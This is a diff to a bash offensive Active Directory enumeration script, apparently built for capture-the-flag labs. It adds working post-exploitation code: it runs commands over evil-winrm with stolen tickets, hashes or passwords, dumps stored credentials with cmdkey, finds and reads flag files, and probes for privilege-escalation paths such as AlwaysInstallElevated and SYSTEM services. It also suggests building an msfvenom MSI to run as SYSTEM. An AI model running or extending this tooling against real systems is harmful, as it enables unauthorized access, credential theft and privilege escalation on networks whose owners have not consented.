@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.30.0"
+readonly VERSION="1.31.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2340,6 +2340,47 @@ phase_wsus() {
 #  WINRM ACCESS + DPAPI  —  where can we land a shell, and what's in DPAPI
 # ===========================================================================
 # Run whoami /priv + /groups over WinRM and map dangerous rights to techniques
+# Run command(s) over evil-winrm (reusing whatever auth we hold) and echo output.
+# Kerberos uses KRB5CCNAME + realm (now that the per-run krb5.conf is correct);
+# else NTLM -H/-p. Newline-separated commands are run then `exit`.
+_winrm_exec() {
+    local cmds="$1"
+    have evil-winrm || return 1
+    local -a ev=(evil-winrm -i "${DC_FQDN:-$DCT}") evenv=()
+    if   [[ -n "$KERB_TICKET" ]]; then evenv=(env "KRB5CCNAME=$KERB_TICKET"); ev+=(-r "$DOMAIN")
+    elif [[ -n "$HASH" ]];       then ev+=(-u "$USER" -H "${HASH##*:}")
+    elif [[ -n "$PASS" ]];       then ev+=(-u "$USER" -p "$PASS")
+    else return 1; fi
+    printf '%s\nexit\n' "$cmds" | timeout "${WINRM_TO:-90}" "${evenv[@]}" "${ev[@]}" 2>/dev/null
+}
+
+# Post-exploitation recon over the WinRM shell — read-only, NO admin needed. Covers
+# exactly what the admin-only `nxc --dpapi` can't: our OWN creds (cmdkey/credman),
+# flags, and the local privesc surface (AlwaysInstallElevated, non-system32 SYSTEM
+# services, SYSTEM scheduled tasks, top-level dirs). Findings feed the engine.
+_winrm_postex() {
+    have evil-winrm || return
+    subsection "WinRM post-exploitation recon (as ${USER})"
+    local ps
+    ps='whoami /all; echo "===CMDKEY==="; cmdkey /list; '
+    ps+='echo "===FLAGS==="; Get-ChildItem C:\Users -Recurse -Include user.txt,root.txt,flag.txt -ErrorAction SilentlyContinue | %{ $_.FullName; Get-Content $_.FullName -ErrorAction SilentlyContinue }; '
+    ps+='echo "===AIE==="; reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; '
+    ps+='echo "===SVC==="; Get-CimInstance Win32_Service | ?{ $_.PathName -notmatch "system32" -and $_.StartName -match "SYSTEM|LocalSystem" } | Select Name,StartName,PathName | Format-List; '
+    ps+='echo "===TASKS==="; Get-ScheduledTask | ?{ $_.Principal.UserId -match "SYSTEM" } | Select TaskName,TaskPath | Format-List; '
+    ps+='echo "===CDRIVE==="; Get-ChildItem C:\ -Force -ErrorAction SilentlyContinue | Select Name'
+    local out="$OUTDIR/winrm_postex_$(_safe_name "$USER").txt"
+    _winrm_exec "$ps" | tee "$out" >>"$LOGFILE"
+    [[ ! -s "$out" ]] && { info "WinRM post-ex produced no output (shell/Kerberos issue)"; return; }
+    grep -qiE 'AlwaysInstallElevated.*0x1' "$out" 2>/dev/null \
+        && loot "★ AlwaysInstallElevated=1 → install an MSI as SYSTEM (msfvenom -f msi)"
+    grep -iE '^\s*(Target|User):' "$out" 2>/dev/null | grep -viE 'NoneType|currently stored' | head -6 \
+        | while read -r l; do info "  cmdkey → $l"; done
+    grep -oiE '[A-Fa-f0-9]{30,32}\b' "$out" 2>/dev/null | head -4 \
+        | while read -r f; do loot "★ flag/secret-looking string in shell output: ${C_GREEN}$f${C_RESET} (winrm_postex)"; done
+    harvest_secrets "winrm-postex" < "$out"
+    loot "WinRM post-ex recon → $(basename "$out")"
+}
+
 analyze_privileges() {
     local args; mapfile -t args < <(nxc_cred_args)
     subsection "Token privileges & dangerous rights (whoami /priv, /groups)"
@@ -2463,6 +2504,9 @@ phase_winrm_dpapi() {
             # evil-winrm when nxc's winrm -x chokes (the Kerberos case), so we get
             # whoami /priv + /groups even when winrm_err==1.
             analyze_privileges
+            # Then mine the shell for the next step (own-user creds + local privesc),
+            # which the admin-only nxc --dpapi can't reach. Read-only.
+            _winrm_postex
         elif [[ "$winrm_err" == "1" ]]; then
             warn "WinRM probe errored (known nxc Kerberos bug) and ${USER} isn't in Remote Management Users → assume no WinRM"
         else
